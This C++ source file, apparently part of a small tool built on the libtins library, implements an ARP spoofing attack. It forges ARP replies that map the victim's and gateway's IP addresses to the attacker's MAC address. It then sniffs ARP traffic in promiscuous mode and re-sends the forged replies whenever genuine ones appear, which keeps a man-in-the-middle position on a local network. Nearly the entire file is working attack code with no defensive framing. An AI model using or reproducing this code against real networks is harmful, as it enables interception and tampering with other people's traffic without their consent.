/*
 * Spoofer.cpp
 *
 *  Created on: 10 de ago de 2015
 *      Author: rodopoulos
 */

#include "Spoofer.h"

using namespace Tins;

EthernetII 	 Spoofer::toGateway;
EthernetII 	 Spoofer::toVictim;
PacketSender Spoofer::sender;

Spoofer::Spoofer() {}
Spoofer::~Spoofer() {}

void Spoofer::init(){
	pthread_t spooferThread;
	if(pthread_create(&spooferThread, NULL, spoof, NULL) < 0){
		std::cerr << "\033[1;31m [Error]"
					 " Spoofer::init ->"
					 "\033[0m can't create spoofer thread" << std::endl;
		exit(EXIT_FAILURE);
	}
}

void* Spoofer::spoof(void* args){
	ARP victimArp (
		Globals::victim.ip, Globals::gateway.ip,
		Globals::victim.mac, Globals::attacker.mac
	),
	gatewayArp(
		Globals::gateway.ip, Globals::victim.ip,
		Globals::gateway.mac, Globals::attacker.mac
	);

	victimArp.opcode(ARP::REPLY);
	gatewayArp.opcode(ARP::REPLY);

	toGateway = EthernetII(Globals::gateway.mac, Globals::attacker.mac) / gatewayArp;
	toVictim  = EthernetII(Globals::victim.mac, Globals::attacker.mac) / victimArp;

	sender.default_interface(Globals::iface);
	sender.send(toGateway);
	sender.send(toVictim);

	std::string filter = "arp";
	Sniffer sniffer(Globals::iface.name(), Sniffer::PROMISC, filter);
	std::cout << "Spoofing is on." << std::endl;
	sniffer.sniff_loop(arpHandle);

	return nullptr;
}

bool Spoofer::arpHandle(PDU& packet){
	const ARP &arp = packet.rfind_pdu<ARP>();
	if(arp.opcode() == ARP::REPLY){
		if((arp.sender_ip_addr() == Globals::gateway.ip ||
			arp.sender_ip_addr() == Globals::victim.ip) &&
			arp.sender_hw_addr() != Globals::attacker.mac
		){
			sender.send(toGateway);
			sender.send(toVictim);
			//std::cout << "Send spoof!" << std::endl;
			return true;
		}

	} else if(arp.opcode() == ARP::REQUEST){
		if((arp.target_ip_addr() == Globals::gateway.ip ||
			arp.target_ip_addr() == Globals::victim.ip) &&
			arp.sender_hw_addr() != Globals::attacker.mac
		){
			sender.send(toGateway);
			sender.send(toVictim);
			//std::cout << "Send spoof!" << std::endl;
			return true;
		}
	}
	return true;
}
